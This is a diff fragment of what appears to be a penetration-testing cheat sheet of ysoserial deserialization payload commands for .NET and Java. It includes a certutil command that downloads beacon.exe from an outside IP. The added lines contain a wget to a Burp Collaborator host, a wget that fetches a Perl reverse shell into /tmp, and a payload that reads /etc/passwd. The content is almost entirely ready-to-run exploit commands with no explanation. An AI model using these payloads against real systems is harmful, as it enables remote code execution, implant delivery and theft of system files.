@@ -9,7 +9,13 @@ ysoserial.exe -f SoapFormatter -g TextFormattingRunProperties -c "cmd /c ipconfi
 ysoserial.exe -f SoapFormatter -g TextFormattingRunProperties -c "cmd /c hostname" -o raw
 ysoserial.exe -f SoapFormatter -g TextFormattingRunProperties -c "cmd /c certutil.exe -urlcache -split -f  http://192.168.100.199\beacon.exe C:\\Users\\Public\\beacon.txe" -o raw
 ```
+# Deserialization 
+```
 
+java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget sdfsfdoztjxibkocen698fskck0ehs8yymn.burpcollaborator.net"
+java -jar ysoserial-0.0.5-all.jar CommonsCollections1 'wget http://192.168.100.199:1010/reverse-shell.pl -O /tmp/shell.pl' > perl-reverse-shell.pl.bin
+java -jar ysoserial-0.0.5-all.jar CommonsCollections1 'cat /etc/passwd' > passwd.bin
+```
 
 ```
 <?xml version="1.0"?>
